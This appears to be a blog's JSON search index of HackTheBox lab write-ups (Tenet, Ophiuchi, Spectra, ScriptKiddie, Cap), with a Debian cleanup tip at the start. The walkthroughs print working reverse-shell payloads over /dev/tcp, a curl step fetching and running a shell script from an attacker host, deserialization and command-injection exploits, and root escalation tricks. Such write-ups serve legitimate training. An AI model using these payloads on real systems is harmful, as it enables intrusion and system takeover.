leftovers from your Debian system is to use Synaptic package manager.If Synaptic package manager is not installed, you can install it using command:$ sudo apt install synapticRemove Unnecessary Configuration Files On Debian-based SystemsThere are couple ways to do this. I have given three methods to remove unwanted config files from Debian and its derivatives.Using aptitude:This is the easiest and shortest command to delete unnecessary configuration files from your Debian-based system:$ sudo aptitude purge ~cOr,$ sudo aptitude purge ?config-filesPlease note that the aptitude command is not pre-installed by default. You can install it using the command:$ sudo apt install aptitudeAlternatively, use the following command to delete the unwanted config files:$ sudo aptitude purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`Using dpkg command:If you don‚Äôt have aptitude installed, you can use dpkg to purge unwanted config files.To find and delete unused config files using dpkg, run:$ dpkg -l | grep \"^rc\" | awk '{print $2}' | sudo xargs dpkg -POr,$ dpkg -l | grep \"^rc\" | awk '{print $2}' | sudo xargs dpkg --purge Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "HTB Tally",
    "url": "/posts/Tally/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Netmon",
    "url": "/posts/Netmon/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Lightweight",
    "url": "/posts/Lightweight/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB LaCasaDePapel",
    "url": "/posts/LaCasaDePapel/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Jeeves",
    "url": "/posts/Jeeves/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Jail",
    "url": "/posts/Jail/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Hawk",
    "url": "/posts/Hawk/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Falafel",
    "url": "/posts/Falafel/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB DevOops",
    "url": "/posts/DevOops/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Bart",
    "url": "/posts/Bart/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Active",
    "url": "/posts/Active/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Tenet Writeup",
    "url": "/posts/Tenet/",
    "categories": "HackTheBox, Writeup, Medium",
    "tags": "Writeup, HTB-Medium",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "INFOMachine IP = 10.10.10.223OS       = LinuxLevel    = MEDIUMPoints   = 30Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.223 tenet.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV 1...",
    "content": "INFOMachine IP = 10.10.10.223OS       = LinuxLevel    = MEDIUMPoints   = 30Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.223 tenet.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV 10.10.10.223EnumerationPort 80 ‚Äì WordPress BlogCreate a directory tenet and cd tenet/ then let‚Äôs do Gobustergobuster dir -u http://10.10.10.223 -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js -t 80 -o gobuster.log  -x   ‚Äìextensions string \tFile extension(s) to search for  -t   ‚Äìthreads int \tNumber of concurrent threads (default 10)We notice in the /Wordpress page there is a post called Migration with a comment by the user neil:did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!It‚Äôs seems like there is a backup site called sator.php. Adding sator.tenet.htb to our /etc/hosts file, and navigating to the URLhttp://10.10.10.223/sator.phpwe see this:[+] Grabbing users from text file[] Database updatedSo, the php file is there and it‚Äôs getting executed. Since there was a mention of a backup file by the use neil, lets try to download that file:wget http://sator.tenet.htb/sator.php.bakAfter download sator.php.bak rename it to sator.phpLet‚Äôs check the code:# sator.php&lt;?phpclass DatabaseExport{        public $user_file = 'users.txt';        public $data = '';        public function update_db()        {                echo '[+] Grabbing users from text file &lt;br&gt;';                $this-&gt; data = 'Success';        }        public function __destruct()        {                file_put_contents(__DIR__ . '/' . $this -&gt;user_file,$this-&gt;data);                echo '[] Database updated &lt;br&gt;';        //      echo 'Gotta get this working properly...';        }}$input = $_GET['arepo'] ?? '';$databaseupdate = unserialize($input);$app = new DatabaseExport;$app -&gt; update_db();?&gt;We see that the script looks for a GET input variable arepo and unserializes it. To exploit this, lets look at Exploiting PHP Deserialization.To write the exploit, lets do the following:  Write the class DatabaseExport on our local machine, define the user_file to be a php file and the data to be a php reverse shell to our local machine.  Serialize it and urlencode it to pass to the GET variable.Now, open a php interactive cli using:php -a Write the following:class DatabaseExport {  public $user_file = 'exploit.php';  public $data = '&lt;?php exec(\"/bin/bash -c \\'bash -i &gt; /dev/tcp/&lt;Your IP address&gt;/&lt;Port for revers connection&gt; 0&gt;&amp;1\\'\"); ?&gt;';  }print urlencode(serialize(new DatabaseExport));The payload is generated. Copy the URL encoded output and make the request using curl:curl -i http://sator.tenet.htb/sator.php?arepo=&lt;Add URL encoded output here&gt;Open a nc listener on port that you added on payload and get a reverse shell by browsing to:10.10.10.223/exploit.phpnc -nvlp &lt;Your Port&gt;Now we have a reverse shellPrivilege EscalationChecking in the /wordpress directory, we find credentials:now do cat wp-config.php then we get this DB configrationdefine( 'DB_USER', 'neil' );define( 'DB_PASSWORD', 'Opera2112' );Do ssh into the  user: neil  password: Opera2112ssh neil@10.10.10.223Getting RootCheck our privileges as the user neil:neil@tenet:/$ sudo -lUser neil may run the following commands on tenet:(ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.shChecking this file /usr/local/bin/enableSSH.sh, we see the following function:addKey() {        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)        (umask 110; touch $tmpName)        /bin/echo $key &gt;&gt;$tmpName        checkFile $tmpName        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys        /bin/rm $tmpName}The script:  Generates and writes a SSH public key (id_rsa.pub) to the file /tmp/ssh-XXXXXXXX  Copies the contents of this folder to root/.ssh/authorized_keys  Deletes the tmp file.Lets do the 3 steps to exploit thisStep 1First create an id_rsa on your local machine using ssh-keygen Run the following script as neil:neil@tenet:/$ while true; do echo \"YOUR id_rsa.pub key\" | tee /tmp/ssh-*;DoneThis is going to continuously write your public key to the tmp folderStep 2Run the enableSSH.sh script many times until we get a successful message:neil@tenet:/etc/ssh$ sudo /usr/local/bin/enableSSH.shError in adding root@ubuntu to authorized_keys file!neil@tenet:/etc/ssh$ sudo /usr/local/bin/enableSSH.shError in adding root@ubuntu to authorized_keys file!neil@tenet:/etc/ssh$ sudo /usr/local/bin/enableSSH.shSuccessfully added root@ubuntu to authorized_keys file!Step 3On your local hostkali@kali:~/.ssh$ chmod 600 id_rsaThen ssh into the tenet box as root:kali@kali:~/.ssh$ ssh -i id_rsa root@10.10.10.223Done! Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "HTB Ophiuchi Writeup",
    "url": "/posts/Ophiuchi/",
    "categories": "HackTheBox, Writeup, Medium",
    "tags": "Writeup, HTB-Medium",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "INFOMachine IP = 10.10.10.227OS       = LinuxLevel    = MEDIUMPoints   = 30Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.227 ophiuchi.htb\" &gt;&gt; /etc/hostsSCANNINGnmap -sC -s...",
    "content": "INFOMachine IP = 10.10.10.227OS       = LinuxLevel    = MEDIUMPoints   = 30Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.227 ophiuchi.htb\" &gt;&gt; /etc/hostsSCANNINGnmap -sC -sV 10.10.10.227 -oN ophiuchi ENUMERATIONNmap:PORT      STATE    SERVICE       VERSION22/tcp    open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)912/tcp   filtered apex-mesh1247/tcp  filtered visionpyramid2007/tcp  filtered dectalk8080/tcp  open     http          Apache Tomcat 9.0.38|_http-title: Parse YAML49159/tcp filtered unknownPort 8080 - Apache tomcat server:YAML is a human-readable data-serialization language. It is commonly used for configuration files and in applications where data is being stored or transmitted.References wikiWe can use this deserialization vulnerablity to get remote code execution. The original paper is to be found at mbechler And the YAML payload we are going to use is found at artsploit.SnakeYAML deserialization exploitWe clone the repo and edit AwesomeScriptEngineFactory.java file to execute are desired commands.git clone https://github.com/artsploit/yaml-payloadWe can execute system commands useing the Runtime.getRuntime().exec(). We write a bash script revshell.sh as follows#!/bin/shbash -i &gt;&amp; /dev/tcp/10.10.14.52/8888 0&gt;&amp;1Next we insert the commands to be executed on target machine. We use curl to get the revshell.sh from our machine and execute it.public class AwesomeScriptEngineFactory implements ScriptEngineFactory {    public AwesomeScriptEngineFactory() {        try {            Runtime.getRuntime().exec(\"curl http://10.10.14.52/revshell.sh  -o /tmp/revshell.sh \");            Runtime.getRuntime().exec(\"bash /tmp/revshell.sh \");        } catch (IOException e) {            e.printStackTrace();        }    }Now as per the instructions, we use the following commands to get our payload jar filecd yaml-payloadjavac src/artsploit/AwesomeScriptEngineFactory.javajar -cvf yaml-payload.jar -C src/ .Now, we have our payload jar file. We start a python web server at port 80python3 -m http.server 80Open a nc listener at port 8888 to get our reverse shellnc -lnvp 8888And insert the following YAML into the parser to get RCE. We also .!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL [\"http://10.10.14.52/yaml-payload.jar\"]  ]]]UserGoing to the home directory, we find a user named admin.I found the user creds in the filecat /opt/tomcat/conf/tomcat-users.xmlWe find the following in the file:&lt;user username=\"admin\" password=\"whythereisalimit\" roles=\"manager-gui,admin-gui\"/&gt;Credentials found:User: adminPassword: whythereisalimitWe can now ssh into the machine as suer admin using the obtained creds.ssh admin@10.10.10.227admin@ophiuchi:~$ cat user.txt RootCheck out what sudo capabilities for our user admin using sudo -l:admin@ophiuchi:~$ sudo -lMatching Defaults entries for admin on ophiuchi:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser admin may run the following commands on ophiuchi:    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.goSo we can run/usr/bin/go run /opt/wasm-functions/index.gowith root privileges. Let‚Äôs check out the file. We get the followingpackage mainimport (        \"fmt\"        wasm \"github.com/wasmerio/wasmer-go/wasmer\"        \"os/exec\"        \"log\")func main() {        bytes, _ := wasm.ReadBytes(\"main.wasm\")        instance, _ := wasm.NewInstance(bytes)        defer instance.Close()        init := instance.Exports[\"info\"]        result,_ := init()        f := result.String()        if (f != \"1\") {          &lt;==========================================                fmt.Println(\"Not ready to deploy\")        } else {                fmt.Println(\"Ready to deploy\")                out, err := exec.Command(\"/bin/sh\", \"deploy.sh\").Output()                if err != nil {                        log.Fatal(err)                }                fmt.Println(string(out))        }}Here, we see that, functions and variables ar imported from the main.wasm file and checking the value of the varibale f, if it equals 1, we get ready to deploy and execute /bin/sh deploy.sh.What‚Äôs notable here is that absolute path is not used for main.wasm and the deploy.sh files.So we can manipulate these. These files will be read from our current working directory, from where we run the index.go file.We make our working directory in tmp and copy over the main.wasmfile.cd tmpmkdir work &amp;&amp; cd workcp /opt/wasm-functions/main.wasm ./We write our own deploy.sh file that echos out the id of the user.#!/bin/shecho $(id)We got this after run ituid=0(root) gid=0(root) groups=0(root)Now, we run the following as sudosudo /usr/bin/go run /opt/wasm-functions/index.goWe get the error Not ready to deploy. So the value of f is not 1, which is read from the wasm file.Wasm is short for WebAssembly. WebAssembly is an open standard that defines a portable binary-code format for executable programs, and a corresponding textual assembly language, as well as interfaces for facilitating interactions between such programs and their host environment.The text readable format of WASM binary is WAT(Web Assembly Text). We can manipulate the value of f editing the wasm file in this format.We install the toolsuit webassembly We have 2 binaries wasm2wat and wat2wasm that we can use.We transfer the main.wasm file from the target machine to our local machine using nccat main.wasm | nc {your-ip} {your-port}   (on target)nc -lnvp {your-port} &gt; main.wasm           (on local)We convert the wasm to wat and get the followingwasm2wat main.wasm &gt; main.watcat main.wat(module  (type (;0;) (func (result i32)))  (func $info (type 0) (result i32)    i32.const 0)      &lt;=======================================  (table (;0;) 1 1 funcref)  (memory (;0;) 16)  (global (;0;) (mut i32) (i32.const 1048576))  (global (;1;) i32 (i32.const 1048576))  (global (;2;) i32 (i32.const 1048576))  (export \"memory\" (memory 0))  (export \"info\" (func $info))  (export \"__data_end\" (global 1))  (export \"__heap_base\" (global 2)))Here we see that the value of f is a constant 0, we change that to 1, our required value.[-]    i32.const 0)[+]    i32.const 1)Now we conver the wat back to nasm and move it to our target machine working directory.wat2wasm main.watscp main.wasm admin@ophiuchi.htb:/tmp/workNow, we run the sudo command again. And this time we get command execution as rootReady to deployuid=0(root) gid=0(root) groups=0(root)We get our id_rsa.pub using ssh-keygen and paste it to the authorized_keys file at /root/.ssh/ using the deploy.sh fileto be able to SSH into the machine as root.#!/bin/shecho $(id)echo \"ssh-rsa *****= root@kali\" &gt;&gt; /root/.ssh/authorized_keysNow we can ssh into root and get our root.txt filessh root@ophiuchi.htbcat root.txt Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "HTB Spider Writeup",
    "url": "/posts/Spider/",
    "categories": "HackTheBox, OSCP, Writeup",
    "tags": "Writeup, OSCP",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "",
    "content": ""
  },
  
  {
    "title": "HTB Spectra Writeup",
    "url": "/posts/Spectra/",
    "categories": "HackTheBox, Writeup, Easy",
    "tags": "Writeup, HTB-Easy",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "INFOMachine IP = 10.10.10.229OS       = OtherLevel    = EASYPoints   = 20Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.229 spectra.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV 1...",
    "content": "INFOMachine IP = 10.10.10.229OS       = OtherLevel    = EASYPoints   = 20Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.229 spectra.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV 10.10.10.229EnumerationNmap:22/tcp ssh  OpenSSH 8.1 (protocol 2.0)80/tcp http nginx 1.17.41098/tcp filtered rmiactivation3306/tcp mysql MySQL (unauthorized)Port 80 ‚Äì WordPress BlogCreate a directory Spectra and cd Spectra/ then let‚Äôs do GobusterGobuster:gobuster dir -u http://10.10.10.229 -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js -t 80 -o gobuster.log/index.html           (Status: 200) [Size: 283]/main                 (Status: 301) [Size: 169] [--&gt; http://10.10.10.229/main/]/testing              (Status: 301) [Size: 169] [--&gt; http://10.10.10.229/testing/]We found like backup config file for a Wordpress check source here You can Download it via wget http://10.10.10.229/testing/wp-config.php.saveThe important part is a user and password credential: /** MySQL database username */define( 'DB_USER', 'devtest' );/** MySQL database password */define( 'DB_PASSWORD', 'devteam01' );Wordpress users enumeration with wpscan: The sceound directory from Gobuster was main which is for a Wordpresswpscan --url http://spectra.htb/main/ --random-user-agent --enumerate uSo we got the user administrator [+] administrator | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: |  Rss Generator (Passive Detection) |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)Upload a Shell file with Metasploit:msf6 &gt; search wp_admin_shell_uploadmsf6 &gt; use exploit/unix/webapp/wp_admin_shell_upload[*] No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set lhost &lt;Your IP here&gt;lhost =&gt; 10.10.15.26msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set lport 4444lport =&gt; 4444msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set rhosts 10.10.10.229rhosts =&gt; 10.10.10.229msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set username administratorusername =&gt; administratormsf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set password devteam01password =&gt; devteam01msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; set targeturi /maintargeturi =&gt; /mainmsf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; exploitshell/bin/sh -iOr you can use:python3 -c \"import pty;pty.spawn('/bin/bash')\"nginx@spectra /tmp $ User Flag:Let‚Äôs check for users:nginx@spectra / $ cat /etc/passwd &lt;SNIP&gt;nginx:x:20155:20156::/home/nginx:/bin/bashkatie:x:20156:20157::/home/katie:/bin/bashnginx@spectra / $ ls -l /home/katie/total 320drwxr-xr-x 2 katie katie   4096 Jan 15 15:55 log-r-------- 1 katie katie     33 Feb  2 15:57 user.txtSo we need to move from our restricted nginx user to katie to get the flag. after search on some places I found in /opt:-rw-r--r-- 1 root root  978 Feb  3 16:02 autologin.conf.origLet‚Äôs have a look at that first:nginx@spectra /opt $ cat autologin.conf.origcat autologin.conf.orig&lt;SNIP&gt;script  passwd=  # Read password from file. The file may optionally end with a newline.  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do    if [ -e \"${dir}/passwd\" ]; then      passwd=\"$(cat \"${dir}/passwd\")\"      break    fi  done&lt;SNIP&gt;It‚Äôs a lengthy config script but there‚Äôs a line in there that points us to /etc/autologin.nginx@spectra /opt $ ls -l /etc/autologintotal 4-rw-r--r-- 1 root root 19 Feb  3 16:43 passwdnginx@spectra /opt $ cat /etc/autologin/passwdSummerHereWeCome!!Perfect. We‚Äôve found a password which presumably is for katie as that‚Äôs the only other user on the box. Let‚Äôs try SSH:ssh katie@10.10.10.229katie@spectra ~ $ cat user.txtRoot Flag:Now we have to escalate our privilege. I going to check a sudo privileges first and if fail I‚Äôll go with linPEAS:katie@spectra ~ $ sudo -lUser katie may run the following commands on spectra:    (ALL) SETENV: NOPASSWD: /sbin/initctlWhat is a initctl:initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon.init is the parent of all processes on the system, it is executed by the kernel and is responsible for starting all other processes.So we can use initctl to control starting and stopping processes as system. Sounds like a nice simple way to get a root shell. First let‚Äôs see what‚Äôs /etc/init:katie@spectra /etc/init $ ls -ltotal 752...-rw-rw---- 1 root developers  478 Jun 29  2020 test.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test1.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test10.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test2.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test3.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test4.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test5.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test6.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test7.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test8.conf-rw-rw---- 1 root developers  478 Jun 29  2020 test9.conf...Let‚Äôs check out the first one:katie@spectra /etc/init $ cat test.confdescription \"Test node.js server\"author      \"katie\"start on filesystem or runlevel [2345]stop on shutdownscript    export HOME=\"/srv\"    echo $$ &gt; /var/run/nodetest.pid    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.jsend scriptpre-start script    echo \"[`date`] Node Test Starting\" &gt;&gt; /var/log/nodetest.logend scriptpre-stop script    rm /var/run/nodetest.pid    echoWe can replace the contents of this with our own code, let‚Äôs get it to change permissions on /bin/bash so we can run it with root permissions as katie.First find the test process:katie@spectra /etc/init $ sudo initctl list | grep testtest stop/waitingtest1 stop/waitingtest7 stop/waitingtest6 stop/waitingtest5 stop/waitingtest4 stop/waitingtest10 stop/waitingIt‚Äôs already stopped, so we can edit the conf file and the start it again:katie@spectra /etc/init $ cat test.conf description \"Test node.js server\"author      \"katie\"start on filesystem or runlevel [...]stop on shutdownscriptchmod +s /bin/bashend scriptNow we can start the process:katie@spectra /etc/init $ sudo /sbin/initctl start testNow we can simply run bash with the -p option to get our root shell:katie@spectra /etc/init $ /bin/bash -pbash-4.3# whoamirootGrab the root flag and we are done:bash-4.3# cat /root/root.txtDone!. Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "HTB ScriptKiddie Writeup",
    "url": "/posts/ScriptKiddie/",
    "categories": "HackTheBox, Writeup, Easy",
    "tags": "Writeup, HTB-Easy",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "INFOMachine IP = 10.10.10.226OS       = LinuxLevel    = EASYPoints   = 20Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.226 scriptkiddie.htb\" &gt;&gt; /etc/hostsScanningnmap -sC ...",
    "content": "INFOMachine IP = 10.10.10.226OS       = LinuxLevel    = EASYPoints   = 20Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.226 scriptkiddie.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV 10.10.10.226EnumerationNmap:PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)the page has a msfvenom upload tab‚Ä¶which can take a template.searched google for msf template upload vuln.Found it has a CVE-2020-7384,found a github page‚Ä¶git cloned the code..ran the program ,got an apk filehttps://www.exploit-db.com/exploits/49491Orhttps://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/msf6 &gt; use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injectionmsf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; set LHOST &lt;Your IP Address&gt;msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) &gt; run[+] msf.apk stored at /home/kali/.msf4/local/msf.apknc -lnvp 4444Then upload apk to site and set IP to 127.0.0.1 or any IP Address and chose Androidto get a reverse shelllistening on [any] 4444 ...connect to [10.10.15.26] from (UNKNOWN) [10.10.10.226] 38492iduid=1000(kid) gid=1000(kid) groups=1000(kid)Also you can do this steps to get a ()  Get id_rsa.pub from your VM or pc  On reverse shell add your id_rsa to    echo \"ssh-rsa ****=\" &gt;&gt; ~/.ssh/authorized_keys        Then do ssh    ssh kid@10.10.10.226        ```python3 -c ‚Äòimport pty; pty.spawn(‚Äú/bin/bash‚Äù)‚Äôkid@scriptkiddie:~/html$  kid@scriptkiddie:~/html$ cd ~cd ~kid@scriptkiddie:~$ lslshtml  logs  snap  user.txtkid@scriptkiddie:~$ cat user.txtcat user.txtLet's enumerat a logs folder- Logs folder have only hackers file and it's empty - Home directory have two users (kid - pwn) and root user in ``` /etc/passwd ```In pwn found a scanlosers.sh file..having the code.#!/bin/bashlog=/home/kid/logs/hackerscd /home/pwn/cat $log | cut -d‚Äô ‚Äò -f3- | sort -u | while read ip; do    sh -c ‚Äúnmap ‚Äìtop-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null‚Äù &amp;doneif [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fiGo to logs folder, and run a reverse shell through the following code.echo ‚Äú  ;/bin/bash -c ‚Äòbash -i &gt;&amp; /dev/tcp/10.10.15.26/8181 0&gt;&amp;1‚Äô #‚Äù¬†¬ª hackersAnd run a netcatnc -lnvp 8181On revers shell run thissudo msfconsolemsf6 &gt; /bin/bashstty: ‚Äòstandard input‚Äô: Inappropriate ioctl for device[*] exec: /bin/bashcat /root/root.txt```Done! Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "HTB Knife Writeup",
    "url": "/posts/Knife/",
    "categories": "HackTheBox, Writeup, Easy",
    "tags": "Writeup, HTB-Easy",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "INFOMachine IP = 10.10.10.242OS       = LinuxLevel    = EASYPoints   = 20Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.242 ophiuchi.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV ...",
    "content": "INFOMachine IP = 10.10.10.242OS       = LinuxLevel    = EASYPoints   = 20Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.242 ophiuchi.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV 10.10.10.242Enumeration Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  },
  
  {
    "title": "HTB Cap Writeup",
    "url": "/posts/Cap/",
    "categories": "HackTheBox, Writeup, Easy",
    "tags": "Writeup, HTB-Easy",
    "date": "2020-03-11 17:00:00 +0100",
    





    
    "snippet": "INFOMachine IP = 10.10.10.245OS       = LinuxLevel    = EASYPoints   = 20Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.245 cap.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV 10.10...",
    "content": "INFOMachine IP = 10.10.10.245OS       = LinuxLevel    = EASYPoints   = 20Write the IP of the machine to your /etc/hosts fileecho \"10.10.10.245 cap.htb\" &gt;&gt; /etc/hostsScanningnmap -sC -sV 10.10.10.245Enumeration21/tcp open  ftp     vsftpd 3.0.322/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp open  http    gunicornFTP (Port 21)FTP anonymous login not availableHTTP (Port 80)http://10.10.10.245/I found for each time on reload or click on tab Security Snapshot (5 Second PCAP + Analysis)the variable ID changed and with each time the PCAP file changed no one of them usefull so let‚Äôs try with the value 0 http://10.10.10.245/data/0Then I downloaded 0.PCAP file and opened it with wireshark here we can found FTP credentials as below:USER : nathanPASSSWORD : Buck3tH4TF0RM3!With these credentials we going to login to the FTPwe got first flag user.txtLet‚Äôs use same credentials for SSH ssh nathan@10.10.10.245 -&gt; with password: Buck3tH4TF0RM3!Privilege EscalationHere we going to clone this script linpeas.shThen we foundFiles with capabilities (limited to 50):/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eipThis means that it‚Äôs possible to set the effective user id of the created processTime to privilege escalationnathan@cap:~$ python3Python 3.8.5 (default, Jan 27 2021, 15:41:15) [GCC 9.3.0] on linuxType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import os&gt;&gt;&gt; os.setuid(0)&gt;&gt;&gt; os.system(\"/bin/bash\")root@cap:~#Done! Hi there üëã Support me!  Life is an echo‚Äîwhat you send out comes back."
  }
  
]

